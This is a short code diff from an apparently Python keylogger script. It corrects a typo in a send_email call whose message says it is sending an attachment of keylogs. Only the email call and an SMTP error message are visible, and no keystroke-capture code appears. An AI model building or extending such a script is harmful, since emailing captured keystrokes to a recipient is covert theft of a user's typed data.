@@ -44,4 +44,4 @@ def send_email(recipient, subject, message, attachment_path = attach):
         print("SMTP server connection error")
     return True
 
-send_email(recipient,'PyMail','This email was sent using Pyhton. Sending attachment with keylogs.''path')
+send_email(recipient,'PyMail','This email was sent using Python. Sending attachment with keylogs.''path')
